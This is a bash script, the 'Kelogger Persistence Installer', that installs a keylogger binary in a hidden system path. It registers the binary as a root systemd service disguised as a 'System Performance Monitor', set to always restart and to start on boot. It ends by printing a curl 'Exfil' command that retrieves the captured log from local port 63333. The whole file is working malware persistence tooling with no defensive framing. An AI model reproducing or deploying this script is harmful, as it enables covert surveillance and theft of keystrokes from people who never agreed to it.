#!/bin/bash
# Persistence
# Run from same folder as System-Shell
# Example: ./install_persistence.sh

set -e

# === CONFIG ===
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BINARY_SRC="$SCRIPT_DIR/System-Shell-Service"
BINARY_DST="/opt/.sysd/tool"
SERVICE_NAME="sysmonitor"
SERVICE_FILE="/etc/systemd/system/$SERVICE_NAME.service"
# ==============

echo "[*] Kelogger Persistence Installer"

# 1. Validate binary
if [ ! -f "$BINARY_SRC" ]; then
    echo "[!] ERROR: System-Shell not found in $SCRIPT_DIR"
    echo "    Place 'System-Shell' in the same folder and retry."
    exit 1
fi

# 2. Install to hidden system-like path
echo "[*] Installing to $BINARY_DST"
sudo mkdir -p /opt/.sysd
sudo cp "$BINARY_SRC" "$BINARY_DST"
sudo chmod +x "$BINARY_DST"

# 3. Create stealth systemd service
echo "[*] Creating service: $SERVICE_NAME"
sudo bash -c "cat > $SERVICE_FILE" << EOF
[Unit]
Description=System Performance Monitor
After=network.target

[Service]
Type=simple
ExecStart=$BINARY_DST
Restart=always
RestartSec=15
User=root
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
Nice=19
OOMScoreAdjust=-100

[Install]
WantedBy=multi-user.target
EOF

# 4. Enable & start
echo "[*] Enabling and starting $SERVICE_NAME.service"
sudo systemctl daemon-reexec
sudo systemctl enable "$SERVICE_NAME.service" >/dev/null
sudo systemctl start "$SERVICE_NAME.service" >/dev/null

# 5. Verify
sleep 2
if ss -tuln | grep -q ":63333 "; then
    echo "[+] SUCCESS: Tool is RUNNING (port 63333)"
    echo "[+] Auto-start ENABLED on boot"
    echo "[+] Exfil: curl http://127.0.0.1:63333 -o log.enc"
    echo "[+] Service: systemctl status $SERVICE_NAME"
else
    echo "[!] FAILED: Port 63333 not open"
    sudo systemctl status "$SERVICE_NAME" --no-pager
    exit 1
fi

echo "[*] Persistence installed. Reboot to test."
